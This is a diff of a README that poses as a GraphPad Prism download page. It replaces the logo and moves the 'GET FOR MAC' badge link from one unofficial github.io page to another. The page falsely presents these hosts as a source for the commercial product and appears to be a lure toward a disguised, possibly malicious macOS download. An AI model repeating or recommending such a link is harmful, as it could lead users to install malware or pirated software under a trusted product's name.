@@ -1,14 +1,14 @@
 # GraphPad Prism – Scientific Graphing & Statistics
 
 <div align="center">  
-  <img src="https://www.adalta.it/wp-content/uploads/2023/04/Logo-GraphPad-big2.svg" width="250" alt="GraphPad Prism Logo"/>  
+  <img src="https://prismtc.co.uk/media/hqbl0tks/graphpad-prism-statistical-software-logo.png" width="250" alt="GraphPad Prism Logo"/>  
 </div>  
 
 <br>  
 
 <div align="center">  
 
-[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-update-app.github.io/.github/GraphPadPrism)  
+[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://shaylyshai-software.github.io/.github/GraphPadPrism)  
 
 </div>  
 
